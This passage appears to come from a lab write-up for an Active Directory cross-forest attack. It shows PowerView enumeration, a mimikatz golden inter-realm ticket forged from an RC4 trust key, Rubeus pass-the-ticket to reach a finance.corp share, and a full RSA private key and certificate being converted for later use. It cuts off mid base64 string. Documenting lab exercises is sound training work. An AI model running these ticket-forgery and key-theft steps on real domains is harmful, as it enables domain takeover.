                         195 134 129 192 108 100 97 112 58 47 47 47 67 78 61 102 105 110 97 110 99 101 45 102
                         105 110 97 110 99 101 45 100 99 45 67 65 44 67 78 61 102 105 110 97 110 99 101 45
                         100 99 44 67 78 61 67 68 80 44 67 78 61 80 117 98 108 105 99 37 50 48 75 101 121 37
                         50 48 83 101 114 118 105 99 101 115 44 67 78 61 83 101 114 118 105 99 101 115 44 67
                         78 61 67 111 110 102 105 103 117 114 97 116 105 111 110 44 68 67 61 102 105 110 97
                         110 99 101 44 68 67 61 99 111 114 112 63 99 101 114 116 105 102 105 99 97 116 101 82
                         101 118 111 99 97 116 105 111 110 76 105 115 116 63 98 97 115 101 63 111 98 106 101
                         99 116 67 108 97 115 115 61 99 82 76 68 105 115 116 114 105 98 117 116 105 111 110
                         80 111 105 110 116 48 129 200 6 8 43 6 1 5 5 7 1 1 4 129 187 48 129 184 48 129 181 6
                         8 43 6 1 5 5 7 48 2 134 129 168 108 100 97 112 58 47 47 47 67 78 61 102 105 110 97
                         110 99 101 45 102 105 110 97 110 99 101 45 100 99 45 67 65 44 67 78 61 65 73 65 44
                         67 78 61 80 117 98 108 105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 105 99 101
                         115 44 67 78 61 83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 117
                         114 97 116 105 111 110 44 68 67 61 102 105 110 97 110 99 101 44 68 67 61 99 111 114
                         112 63 99 65 67 101 114 116 105 102 105 99 97 116 101 63 98 97 115 101 63 111 98 106
                         101 99 116 67 108 97 115 115 61 99 101 114 116 105 102 105 99 97 116 105 111 110 65
                         117 116 104 111 114 105 116 121 48 48 6 3 85 29 17 4 41 48 39 160 37 6 10 43 6 1 4 1
                         130 55 20 2 3 160 23 12 21 102 105 110 97 100 109 105 110 64 102 105 110 97 110 99
                         101 46 99 111 114 112 48 77 6 9 43 6 1 4 1 130 55 25 2 4 64 48 62 160 60 6 10 43 6 1
                         4 1 130 55 25 2 1 160 46 4 44 83 45 49 45 53 45 50 49 45 51 49 51 50 52 54 51 48 49
                         50 45 54 49 48 56 49 54 50 48 52 45 51 54 55 49 57 51 49 48 52 52 45 53 48 48 48 13
                         6 9 42 134 72 134 247 13 1 1 11 5 0 3 130 1 1 0 37 209 232 12 128 80 35 11 3 229 87
                         59 157 137 96 172 111 222 149 94 172 146 187 22 108 100 136 140 159 226 215 77 67
                         147 11 179 108 121 109 119 2 249 152 24 233 92 140 188 64 221 65 166 53 188 215 53
                         180 24 188 36 224 40 233 174 130 59 195 142 179 106 242 107 25 104 153 166 108 53
                         166 4 150 31 143 92 97 21 254 176 251 97 253 81 137 159 119 175 83 216 167 73 255
                         189 196 65 113 102 235 71 131 27 150 161 168 156 16 114 24 53 128 41 79 206 168 49
                         25 182 14 171 93 26 116 182 20 126 237 4 81 221 212 41 94 78 8 0 154 121 210 19 74
                         39 52 107 218 185 80 168 109 164 62 89 77 151 206 3 122 213 96 146 207 46 152 218
                         127 156 109 152 72 197 189 5 41 72 89 162 135 170 70 69 54 231 233 80 85 217 190 91
                         93 30 81 220 239 199 33 229 154 63 72 182 173 111 74 69 209 186 36 100 28 27 149 127
                         53 242 2 231 83 243 55 234 130 219 47 47 180 96 9 175 35 8 113 10 12 176 169 101 10
                         251 240 133 253 68 78 47 127 211 122 208}
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 12/9/2025 6:35:36 AM
name                   : finadmin
objectsid              : S-1-5-21-3132463012-610816204-3671931044-500
samaccountname         : finadmin
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 1/1/1601 12:00:00 AM
countrycode            : 0
whenchanged            : 12/9/2025 6:35:46 AM
instancetype           : 4
objectguid             : b21ac354-cfe6-420e-8122-3c4ac42a436a
lastlogon              : 12/9/2025 6:35:36 AM
lastlogoff             : 1/1/1601 12:00:00 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname      : CN=finadmin,CN=Users,DC=finance,DC=corp
dscorepropagationdata  : {9/3/2025 9:52:22 AM, 9/3/2025 9:52:22 AM, 9/3/2025 9:29:11 AM, 1/1/1601 6:12:16 PM}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=finance,DC=corp, CN=Domain
                         Admins,CN=Users,DC=finance,DC=corp, CN=Enterprise
                         Admins,CN=Users,DC=finance,DC=corp, CN=Schema Admins,CN=Users,DC=finance,DC=corp...}
whencreated            : 9/3/2025 9:28:33 AM
iscriticalsystemobject : True
badpwdcount            : 2
cn                     : finadmin
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 12/9/2025 6:35:46 AM
usnchanged             : 28737

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainObjectAcl -Domain finance.corp -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq "S-1-5-21-1600556212-896947471-994435180-1000"}
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainObject -Domain finance.corp -LDAPFilter "(description=*tech*)"
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainObject -Domain finance.corp -LDAPFilter "(name=*tech*)"

trusttype              : 2
usncreated             : 16427
trustattributes        : 4
iscriticalsystemobject : True
whenchanged            : 12/9/2025 6:35:37 AM
objectclass            : {top, leaf, trustedDomain}
showinadvancedviewonly : True
usnchanged             : 28733
securityidentifier     : {1, 4, 0, 0...}
dscorepropagationdata  : 1/1/1601 12:00:00 AM
name                   : tech.corp
cn                     : tech.corp
flatname               : TECH
objectcategory         : CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname      : CN=tech.corp,CN=System,DC=finance,DC=corp
trustpartner           : tech.corp
trustposixoffset       : 1073741824
whencreated            : 9/3/2025 10:18:26 AM
instancetype           : 4
objectguid             : ef22a466-f8a3-490b-bb5d-a9cb9d7f9a0f
trustdirection         : 3

pwdlastset             : 12/9/2025 6:35:37 AM
logoncount             : 0
badpasswordtime        : 1/1/1601 12:00:00 AM
distinguishedname      : CN=TECH$,CN=Users,DC=finance,DC=corp
objectclass            : {top, person, organizationalPerson, user}
name                   : TECH$
objectsid              : S-1-5-21-3132463012-610816204-3671931044-1103
samaccountname         : TECH$
codepage               : 0
samaccounttype         : TRUST_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 12/9/2025 6:35:37 AM
instancetype           : 4
usncreated             : 16430
objectguid             : ce82f5fc-114e-47c0-9232-0931ea3dc89e
lastlogoff             : 1/1/1601 12:00:00 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata  : 1/1/1601 12:00:00 AM
lastlogon              : 1/1/1601 12:00:00 AM
badpwdcount            : 0
cn                     : TECH$
useraccountcontrol     : PASSWD_NOTREQD, INTERDOMAIN_TRUST_ACCOUNT
whencreated            : 9/3/2025 10:18:26 AM
primarygroupid         : 513
iscriticalsystemobject : True
usnchanged             : 28735

[tech-dc.tech.corp]: PS C:\Temp\Tools>
```

from the above output, we do see that `finadmin` does have an user certificate but does not have any vulnerable templates - here is the status so far.

1. **SID filtering** blocks privilege escalation across trust
2. **No ADCS** templates in finance.corp to exploit
3. **TECH$ trust account** has no admin rights

Listing the `SMB` shares of the finance.corp domain, we notice a very peculiar share called `TechOperations`, which is what we need to get a hold of but need an inter-realm TGT ticket before accessing it otherwise it results in *access denied*.

```xml
PS C:\Users\studentuser\Desktop> net view \\finance-dc.finance.corp /all
Shared resources at \\finance-dc.finance.corp

Share name      Type  Used as  Comment

-------------------------------------------------------------------------------
ADMIN$          Disk           Remote Admin
C$              Disk           Default share
D$              Disk           Default share
IPC$            IPC            Remote IPC
NETLOGON        Disk           Logon server share
SYSVOL          Disk           Logon server share
TechOperations  Disk
The command completed successfully.
```

[GitHub - S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#cross-forest-attacks)

FINALLY WE READ `TechOperations`

```xml
[tech-dc.tech.corp]: PS C:\Temp\Tools> .\mimikatz.exe "kerberos::golden /user:Administrator /domain:tech.corp /sid:S-1-5-21-1600556212-896947471-994435180 /rc4:4ed7f2d467624ea5e196e99af3357017 /service:krbtgt /target:finance.corp /ticket:C:\Temp\Tools\trust_tkt.kirbi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:tech.corp /sid:S-1-5-21-1600556212-896947471-994435180 /rc4:4ed7f2d467624ea5e196e99af3357017 /service:krbtgt /target:finance.corp /ticket:C:\Temp\Tools\trust_tkt.kirbi
User      : Administrator
Domain    : tech.corp (TECH)
SID       : S-1-5-21-1600556212-896947471-994435180
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4ed7f2d467624ea5e196e99af3357017 - rc4_hmac_nt
Service   : krbtgt
Target    : finance.corp
Lifetime  : 12/9/2025 11:25:42 PM ; 12/7/2035 11:25:42 PM ; 12/7/2035 11:25:42 PM
-> Ticket : C:\Temp\Tools\trust_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz(commandline) # exit
Bye!
[tech-dc.tech.corp]: PS C:\Temp\Tools> .\Rubeus.exe asktgs /ticket:C:\Temp\Tools\trust_tkt.kirbi /service:cifs/finance-dc.finance.corp /dc:finance-dc.finance.corp /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/finance-dc.finance.corp'
[*] Using domain controller: finance-dc.finance.corp (172.16.3.4)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIEuDCCBLSgAwIBBaEDAgEWooIDsjCCA65hggOqMIIDpqADAgEFoQ4bDEZJTkFOQ0UuQ09SUKIqMCig
      AwIBAqEhMB8bBGNpZnMbF2ZpbmFuY2UtZGMuZmluYW5jZS5jb3Jwo4IDYTCCA12gAwIBEqEDAgEEooID
      TwSCA0uH3XaO1ATi4jiCFq6yDCX8Mcu+GQggBy92T5M682PDLUl/izZn+zaCZh1fxWJ5mnPYFTzdaHld
      k049livmtwaw6/4W2wmPh6306SIb2V5By3+Z3UABcwgC3mrihEM35AhSYQuKGsWkMwoIN7gNqD5ARhI6
      r9kvg9PTSIJsehdH3YxlmNUA4Lg4Cit52M7ZE/PQCUUu4/DmHbJaEOny9h25R61fmgKmjjaq3QtkgAxH
      RTTGmWm+hK1oUWwoSgwJUmLlJ6az9vDMsbAgCheGaIwCTIQYymLDm4OU7PeMPzGWyIOgUz5FJS/wPT+y
      9arlxavsglUsTCcmcy+kvcXQxfbS0pP50ic8rQBFE8yqaM4cz1i0I5iArYjpri3MIEX0XG9d7IspmxsQ
      dSOWQSl62qdjZCocBZOJirQ9uQTmNbwMoZHbqcMY4iNMEu5PxvZlTBUw3rUoow4sQ1L2nLhnC6l4PSBk
      fyk8jHL4/5Qa3rwC6xf5yvmvgkRuFYLGTeT7rhbt0+htINWeGnqCRyrzrarHG3AmYka2kbFCK21JodCo
      0RsS+p90gzeaWEy7ECVJS/tHwIweHIUPjF+WLAspkP3g9DRA6ErbYZAMqIprd4ZOJPVmITgjU7+71HUf
      /XoRFx+p3pWNtcvTpjR2lls2pz/rEzy/ilOLVw83vpTd0Kd4d5c946X98dlAQgt6ed4PBKRA3XKJ+Rv2
      gd0P6LcAv8H+1UFqz/FrI6S7gd0Y/pcaBt+mnzqOb7QE7njVGTHeEIbM/sy3FwfdDz/3f0lRyPOacHtA
      Jxlbw72JGXUitLFJQS4f0JgOkVyFHfAb0gnhTEFCGwhHy503PKTJAGXVpH4ldmzqpjoo9NDJd/CyJlCx
      mt8xYHHRozTCp3Wt+0xahxDySa6xQ7crCbAFHbzZCUKdPTruQkc1pG9a6/6nkSD1VxxY6Bn7WWaxxsuT
      CNq+42lZPjQiFK0LKx2D3pgV0tsN7Mrv29XJ8aeQg0fOIuohgSFkRI/XWHa4y0GK4+ZtOMOXhBxkSu+f
      lSkYRhKXRbLbDaoEkyKxCWiBRGrDpXrUHVQ3zBVJAjDaoGR+Du7b4oBLCatwKethwvcsWtOCjp+9imgx
      nhlOt2mlLFijgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCCkLPpCWeG+
      djY+wHFAYbkuwbuOVZgTDOvJLSqKUg8DbaELGwl0ZWNoLmNvcnCiGjAYoAMCAQGhETAPGw1BZG1pbmlz
      dHJhdG9yowcDBQBApQAApREYDzIwMjUxMjA5MjMyNTUyWqYRGA8yMDI1MTIxMDA5MjU1MlqnERgPMjAy
      NTEyMTYyMzI1NTJaqA4bDEZJTkFOQ0UuQ09SUKkqMCigAwIBAqEhMB8bBGNpZnMbF2ZpbmFuY2UtZGMu
      ZmluYW5jZS5jb3Jw

  ServiceName              :  cifs/finance-dc.finance.corp
  ServiceRealm             :  FINANCE.CORP
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  tech.corp
  StartTime                :  12/9/2025 11:25:52 PM
  EndTime                  :  12/10/2025 9:25:52 AM
  RenewTill                :  12/16/2025 11:25:52 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  pCz6QlnhvnY2PsBxQGG5LsG7jlWYEwzryS0qilIPA20=

[tech-dc.tech.corp]: PS C:\Temp\Tools> cmd /c dir \\finance-dc.finance.corp\TechOperations
 Volume in drive \\finance-dc.finance.corp\TechOperations is Windows
 Volume Serial Number is 587C-4046

 Directory of \\finance-dc.finance.corp\TechOperations

09/09/2025  06:10 AM    <DIR>          .
09/09/2025  06:10 AM             3,988 finadmin.pem
               1 File(s)          3,988 bytes
               1 Dir(s)  18,939,187,200 bytes free
[tech-dc.tech.corp]: PS C:\Temp\Tools>
```

**Key difference**: Mimikatz `kerberos::golden` with `/target:` creates proper inter-realm tickets, while Rubeus `silver` was creating local TGTs!

**Why `/user:Administrator` in the Command?**

This creates a ticket for `Administrator@tech.corp` - it's just the username in the ticket, not requiring that user to exist or be logged in. Mimikatz forges this identity.

Key point: You're not authenticating as the real Administrator - you're creating a fake ticket that claims to be Administrator@tech.corp.

```xml
[tech-dc.tech.corp]: PS C:\Temp\Tools> cmd /c type \\finance-dc.finance.corp\TechOperations\finadmin.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEArx5xXYyzvmnt05AgQiT7WdtyOqCn3H9a688nRqr1dwFxqBZL
4xVHHHeblEfo3Bijsiyad6xjz1aPsnl6+OAdEsAAztjO4QAV0Q/j9Qrn0u6nvGQV
eIsAhYF6n9RKfWp9uIkbcqfo9eoKxphgILYLbRJxpt0SKDevYDXxtF8Q34VIpU6N
qsWaOcGmAVEpLF06Pxm3w9MQGsRrvYjspOPgQhG64hVRGIAT9jEKh3J5f//6KLrr
7yCbjMqxz+jwG2bwFYrkcGZNa9JzEPR3PpAiO8l5g0e8Gr1cL4Spbn6Tl/72l702
qYU3T/zc0HbEsqAJRMVz70iRwGCMVOiFB4LPdQIDAQABAoIBAHzhqNad0FCqGgAV
d+uzk8uwwvUsPIjyCVTAlbG/mO0VCohj3hpCwkN6yGgmH9lVeOdHB6DwPv1NLYyJ
NTjmGdWVNv5LfrzV4rkEK/xDmq7BorymYuljtyt9+oSgT77Agodmvzw0od082hJl
96dcKynNTV9BqAEmNNrXnVaTtOSwaSZcQ65UVbAAQe6Ik78qiBvbfgihcIH4F10Q
Fo57xymHSX9ot/LmjC0hIuCzjCxwgmn8KgrapvDmIihKF7yaeCCzx7doGxp7t2q6
oIX0BZX07JN+cVcL88EhQ5y6dUojY0SMpbrKTLbqBJRSiycLWEBIr87wpnqKy+sZ
txOp1sECgYEAxO9quDgl2SOSJ5Ex4wjr86mZE2jXSK3uSwDpx8C7OLZqWouvOgKu
NmZK3DFpOYVqlZ3jNCZOMZDVr2Ats9XaQLfc2uBNw4uDeH4mYvzkU3EwboYz87ej
5ixQgYqgav+t8EXC2cQUXSO3QaEyQ/Q9ibgyjSwfTUqw59vgbUXWZncCgYEA46P7
REGAROAUDTZPHRR3G5rUMpMTp64rcHZK5qx+bJ8eYGNx+BWQqlwHv19KeNuqFRT5
Fk+WogLlkWNOj2gRb4B+7YtGzKUGk6W5a/tyE59rt/I8r0qpklYsJ4zwM5zTiWNU
1wcB23scs9InUj3HjWudl9ft/gXC413rbBTteHMCgYBsTF0bwYTOzEjriWUtvRJE
hNexXM5HIZ8RkAb/2nUa0vXZpUdPV3oGYGp6fJGpGD1s2c7ANvB5QXTBZNq9MrU7
MeE6XG9nQami8XyaowfM+0nu/c5EEJEJWwVKt7lQHhrBLxvgNXwdXC7C4KqLxByz
R6BFEiaEkraGStw4O1eUMQKBgHnTK0hXCY9SoEiF1QcKCcgzLva18WHeew7fr6wN
ikcVTMtmzPpoiBgz0k2fcJqHbFmF9Nv00fd4N2V8UPG8TwBuMv9rdwNUGdXwbfAV
C/LmcV5q/AEPovpWtaCg83ebqTWwfBnrfRn5o920TSjdOSs8+YTmoU49xROrEq+v
73pzAoGBAIVFclS/oyIJY6tg6LdOi+HAohGXer6f715YHUGCIYTN7PtfsO222McK
/G018KctMbukch0o9pu9mT3mxU3gIKSMghIg2nClf+ctHXzOWpCkGrSq2j0FB3Ae
aKXOWH9f6xNw0WW4t9xUTHwmSaZQkLkY8WIBsl0sUbWmrFGBAD1J
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGUjCCBTqgAwIBAgITUQAAAAQx5y3M1NRaigAAAAAABDANBgkqhkiG9w0BAQsF
ADBPMRQwEgYKCZImiZPyLGQBGRYEY29ycDEXMBUGCgmSJomT8ixkARkWB2ZpbmFu
Y2UxHjAcBgNVBAMTFWZpbmFuY2UtZmluYW5jZS1kYy1DQTAeFw0yNTA5MDkwNTU5
NDJaFw0yNjA5MDkwNTU5NDJaMFIxFDASBgoJkiaJk/IsZAEZFgRjb3JwMRcwFQYK
CZImiZPyLGQBGRYHZmluYW5jZTEOMAwGA1UEAxMFVXNlcnMxETAPBgNVBAMTCGZp
bmFkbWluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArx5xXYyzvmnt
05AgQiT7WdtyOqCn3H9a688nRqr1dwFxqBZL4xVHHHeblEfo3Bijsiyad6xjz1aP
snl6+OAdEsAAztjO4QAV0Q/j9Qrn0u6nvGQVeIsAhYF6n9RKfWp9uIkbcqfo9eoK
xphgILYLbRJxpt0SKDevYDXxtF8Q34VIpU6NqsWaOcGmAVEpLF06Pxm3w9MQGsRr
vYjspOPgQhG64hVRGIAT9jEKh3J5f//6KLrr7yCbjMqxz+jwG2bwFYrkcGZNa9Jz
EPR3PpAiO8l5g0e8Gr1cL4Spbn6Tl/72l702qYU3T/zc0HbEsqAJRMVz70iRwGCM
VOiFB4LPdQIDAQABo4IDIjCCAx4wKQYJKwYBBAGCNxQCBBweGgBBAGQAbQBpAG4A
aQBzAHQAcgBhAHQAbwByMDUGA1UdJQQuMCwGCisGAQQBgjcKAwEGCisGAQQBgjcK
AwQGCCsGAQUFBwMEBggrBgEFBQcDAjAOBgNVHQ8BAf8EBAMCBaAwRAYJKoZIhvcN
AQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsOAwIH
MAoGCCqGSIb3DQMHMB0GA1UdDgQWBBRYLZNs6Zd3LCZQRNMUlGF+jG/l9jAfBgNV
HSMEGDAWgBTo39AJSGUlG0BxXkKbI5IcxMhfgDCB1wYDVR0fBIHPMIHMMIHJoIHG
oIHDhoHAbGRhcDovLy9DTj1maW5hbmNlLWZpbmFuY2UtZGMtQ0EsQ049ZmluYW5j
ZS1kYyxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vydmlj
ZXMsQ049Q29uZmlndXJhdGlvbixEQz1maW5hbmNlLERDPWNvcnA/Y2VydGlmaWNh
dGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlv
blBvaW50MIHIBggrBgEFBQcBAQSBuzCBuDCBtQYIKwYBBQUHMAKGgahsZGFwOi8v
L0NOPWZpbmFuY2UtZmluYW5jZS1kYy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5
JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1maW5h
bmNlLERDPWNvcnA/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
ZmljYXRpb25BdXRob3JpdHkwMAYDVR0RBCkwJ6AlBgorBgEEAYI3FAIDoBcMFWZp
bmFkbWluQGZpbmFuY2UuY29ycDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZ
AgGgLgQsUy0xLTUtMjEtMzEzMjQ2MzAxMi02MTA4MTYyMDQtMzY3MTkzMTA0NC01
MDAwDQYJKoZIhvcNAQELBQADggEBACQmP4tqdD07TK9kaz+uksKYjzzIUDrUmgFu
EeFG7whTp+A19u3GQyppfRlV5BG8FxaXgHMa5s2c5DbCbpLfj8tYEn/2GoIBnpFf
FewbUUaZGZVsl+RgSem578yyb7cPtQzsA1QcfxRx3+yNvw7FHNc0yFDwJkgxkqyl
JsEVXU/3OYDYqNgsKMDV4zrSSSxMa0WqnuooD6Lkuoj52GThGSO/HWq/8jvNaiqy
oYdCqI/BriMWUc4aCen8q+0W/caLUcEVyg9PLCotQvVW36z8RovHpSymWrTwjuhv
hzso5KFTyKEp97YcIFfaiV6Jz5DMogMBx941raln5fBDMDSsJyQ=
-----END CERTIFICATE-----
```

Doing a similar `openssl` command on local linux machine then importing the `base64` to `tech-dc`.

`┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CRTP/New]
└─$ openssl pkcs12 -export -out finadmin.pfx -in finadmin.pem -passout pass:`

`┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CRTP/New]
└─$ base64 -w 0 finadmin.pfx
MIINLwIBAzCCDOUGCSqGSIb3D<REDACTED>`

```xml
[tech-dc.tech.corp]: PS C:\Temp\Tools> $pfxBase64 = "MIINLwIBAzCCDOUGCSqGSIb3DQEHAaCCDNYEggzSMIIMzjCCBzoGCSqGSIb3DQEHBqCCByswggcnAgEAMIIHIAYJKoZIhvcNAQcBMF8GCSqGSIb3DQEFDTBSMDEGCSqGSIb3DQEFDDAkBBAhERZ8SyUJxj/SXyV4KlWUAgIIADAMBggqhkiG9w0CCQUAMB0GCWCGSAFlAwQBKgQQpzZHHPEb9ONZgJIHDYcBXICCBrCwFG0aoTXkdc66mxHgfYFZG8IBCV/6re9XF/19j4/VhatuQRGCUgDQm1qD3IuERlp0ljpCfHgOdJLUwkG/agQwAq+JyisHpeLb813/joc4Xq63AGbh3AUhb3JbtZtw4p9L8L/Xg4Rqb9mzXujSOR56ICYGAxXphrXRO3cUtiLt2oq5m4tdv1tQMIAr8oDSJMDzs2uaB56PuV9RcbFZCS6hsGJ1uvqA1om7f8HTU3a+GQTh6Pi/lcAjs9NzOhNWbP2GRAg2ndyR0YSzXBwxa+VT7U3prCo6ekBZzfskDQ7vhk9sIsltUsiS6XL/L2t5peYyd/A3RAwPCM2hr2AnZqVvhIpLK7ZpS1qIltCACLNmATQQMWf5AP0ZiBj6HMeErRkXt/Ad6M6K5/qsWiqIp86vTs+GscjD/lN5AEJDGcEb7lEpBa8F+TCsvOy5gSrUVWjYxYvAIsVNl8ewDBD3ATzQ68n++3z94AlLzF96wUXrVQg/pozunrh2UP48WitDNfHJZ8ALJeVypRAE/3VntvC0UOR8iD/VjgSY2FqDxwXNhHa7KZX4i9Be6lQgz0N8BWZrParAgSK51KbP5oYMcu9GkYMfvo1MupulNIvFetAQ+PPkyvAFt/xaUWjZwuhHg7O7MhqNIQ3S+JeLRIo8Ye5Dfs6rRp8jt6MQpnE/otp/KuCq4WZw1fOcfsTVEv6bG1wDVonwxdPAQDuu8RnOg/GTnBhoSlQ+u6r5JiEuBsMRjboajzz2nfHTIZcig/BxsaE528kxq2wBAxcMr1o5zGFK1YjDwr8YbkOTbFMBxNYm5UaCKRgArkTANIHEuV5COx2epQchY6Eolc8A5yAiVu2v4KrcmZKGVzMre6MxbjSVJQyCC/VVq15pVuRb3CjH3UYmfPcvt/QbogFyuZLhf/FySA7vqvdMxjSRXx9wbynxlSIOUAcUx8KYCR5J9m5U7t/aj6J8MIktV2j87k/7YBydS1+AgJHDMFv58IklSvB7iBoJbJsNiBAXr17MQroal7qsrc8uAnEB7hX8RDg88hFEi+5d9GSPeRniFBs1970vMntY4W/YBuu5TUkneHcccokF86uNqMppeRZ3AnajA3M+AlW7ybv9jl2M3ZO4G7M0lXZJ0YEtSxKTBmELUXHpUlQhu0AVh9Zra5WsnzYXAKv+YDUgjkV8LfQcMGYHnnfINDzxdS0ZsJohqNQRdtB44xDmLEN/VkQYITkNHK093OlrkycsaQK3xaPfVLy0NqToNTyoxjz9EOOOre+Ab6jsdXk/DlXY8kr/XfGeQ8+AKfzVrr3sqLF1esDc5LtZhd68FN3QxjEIGzevde/cLYGHJaPqXhgz9tTlaWbOuq4i6nq2ZAT6pNffmpbPR4v8DVDQosc8FjFuR7TthLDpKlFJVQHN/oFDN9Rja6kFS7lzAw8CGTQPPAoWubepRi/uwScCJFDIKz/ouHkhp1bS7XHNBsj6yjphI8sK4wv0mxoIX7Vw0H5/CRnizZNMGWOlJAF5kPFWohfKYcHQJ14rk/zFi5xQqY2gIBcxVyOYKnLJMy4Pe3Xw5hAXzgCevmJLfh3qjOqXMjvsktq+rpCZ/xpPXmcPp737amj6JiZIGmCiJb1ccadldUtOU9klaWoxGUuX0dKmOdl4aSwsc+TETyjrl/jGT3RV3B5Zy2fKFGpUTu55CwXeOjpxa2HDuZagfaTs/TJ6UhR/XYRbIK2Gt8dFr7PzkngdV/X2p4YkNiqfLo6x0C/BUSxtNrY5fVu9nUZ7yYaLST2CaC2iQ0fhPuyIYJB0h5cPDixqEnM19H5ia0cPmPde1BVgUOQOMirDlYyPWGXKWJd9h8lGmMt9prv6IjA6YHfAibDeZNyMXjxfNJuT/L060uQ3IVOT/cv68A2NDMmOAmW47Yug7WODp4hjgJm7Cwbi02kHopzg6H8pJbBk5UstrJweuvb4/H34BL7CvEnUYET+Jc4oesDmJhOc5KPzQdlaz1JLE3QqsSvGV2i3oDiRFxvykaO/30hXwRGomUN8ZF7ikJFQSlMmlyXcn5v+93qvtB5ZB65KZVv4JHTX96nbLny6IPirX4sTh8DDLdkARlPM+0+Dj7Qpp6U0sjy0PgMSKPpbHneAfeq4o7Cu4X+i0F515qSpLGKjlC0a5DEZuXaZ0mp3QgiFD487UUB5y9S0YP0kdWxV66Di3dlkJE3GjiHocreGMbluiA7+vipF7YQjJHM8aiR4ng5cKVvlPx3G2xSC7JXn+ShCy/gRJ1G9o05d4UDHIGrMU8oOwDCCBYwGCSqGSIb3DQEHAaCCBX0EggV5MIIFdTCCBXEGCyqGSIb3DQEMCgECoIIFOTCCBTUwXwYJKoZIhvcNAQUNMFIwMQYJKoZIhvcNAQUMMCQEEEBHbccnY4P/2U+TX3ftcMoCAggAMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBBAsV36I3lAO9XaL8/qjA8SBIIE0BlLDyyBgF28CTfYzFTC2bcluO/o/wf1pm34fmtYsLcdZdLWRN2VSAzdBtobEkQOY46OdOLyPxo48TLGUNd78zX7nsJtFr3gCGGrPbDiTzC6tWVLA6NGMlhoG+63QFZhZuLPiqG1WrfcQypGToTLS1pTCKo0NnKHA6MOO3QoNnEOroOnSpP3s21vq3FSQG7/FUQiXydJizhFBU/6xOsB9PcT/jQefUWW21/hgKR+lFXXFLd8EkpwHcDtHGdtNwcY/zefYCEo36i3/+fBnPUqKLCIcCPc7Nlh/MBEusNPob4HIUaUuQ4zJrWLkmKUj/joQLj9fb1QJbszn6A/t+l2xqLDkFX5H9MYDjvwmmvlYaloQLqJfPbRoc0kFAMXQv5Ftvu+SEYat7ZYC4YQLVWd0Rm2/3PXyKRXqsO9kwu5wRZ+Zm0yVGFHigFlafqcWKKZdOyuZObi+DH/Br19rYrwgumFvKhc1AtVIUnixUY8NjInSq8HXQQBDRnGA+0gh/1gKouc82ybSnofi1xyAhRw5HRv82g0kJ1GkjR4s9KN3fx1fjJsXyzuH+UYlewh65ex9P2ipod4sO8NnxUFKVb35+9vFXLY/qd1xsYjnLuIe6NYE487ZERGLUCnVtR0jKcIDA2jEzHUnYjr+Xo/28E1YMx/LVgB5kDYM8//EG1V0lFP6rPiu5sRub0I83Jy/fLIJcSb17vcoHqnw/BSaRl8j2Mjy9TnPgPlb+yjRjvUEMxUY